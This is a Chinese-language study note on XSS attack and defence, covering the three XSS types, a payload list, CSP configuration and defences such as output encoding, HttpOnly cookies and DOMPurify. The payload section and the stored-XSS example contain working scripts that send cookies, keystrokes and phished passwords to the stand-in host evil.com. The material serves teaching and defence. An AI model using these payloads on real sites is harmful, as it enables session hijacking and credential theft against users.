# XSS攻防

## 核心知识点

### 一、XSS类型

#### 1. 反射型XSS
```html
<!-- 恶意链接 -->
http://example.com/search?q=<script>alert('XSS')</script>

<!-- 服务端直接输出 -->
<p>搜索结果: <?= $_GET['q'] ?></p>
```

#### 2. 存储型XSS
```html
<!-- 恶意评论 -->
<script>
    fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
<!-- 存入数据库，所有访问者都会执行 -->
```

#### 3. DOM型XSS
```javascript
// 漏洞代码
const name = location.hash.substring(1);
document.getElementById('greeting').innerHTML = 'Hello ' + name;

// 攻击URL
http://example.com/#<img src=x onerror=alert('XSS')>
```

### 二、XSS Payload

```html
<!-- 基础弹窗 -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>

<!-- Cookie窃取 -->
<script>
    new Image().src='https://evil.com/steal?c='+document.cookie;
</script>

<!-- 键盘记录 -->
<script>
    document.onkeypress=function(e){
        fetch('https://evil.com/log?k='+e.key);
    };
</script>

<!-- 钓鱼页面 -->
<script>
    document.body.innerHTML='<h1>会话过期</h1><form action="https://evil.com/phish"><input name="user"><input name="pass" type="password"><button>重新登录</button></form>';
</script>
```

### 三、CSP（内容安全策略）

```nginx
# Nginx配置
add_header Content-Security-Policy "
    default-src 'self';
    script-src 'self' 'nonce-random123';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    connect-src 'self' https://api.example.com;
    frame-ancestors 'none';
";
```

```html
<!-- 使用nonce -->
<script nonce="random123">
    // 允许执行的脚本
</script>
```

### 四、防御方案

#### 1. 输出编码
```python
# HTML编码
import html
safe = html.escape(user_input)

# JavaScript编码
def js_escape(s):
    return s.replace('\\', '\\\\').replace("'", "\\'").replace('"', '\\"')

# URL编码
from urllib.parse import quote
safe_url = quote(user_input)
```

```php
// PHP
htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
```

#### 2. HttpOnly Cookie
```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

#### 3. 前端防御
```javascript
// 使用textContent而非innerHTML
element.textContent = userInput;

// 使用框架自动转义（React/Vue）
// React: {userInput} 自动转义
// Vue: {{ userInput }} 自动转义

// DOMPurify清理
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

#### 4. 安全头部
```http
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
```
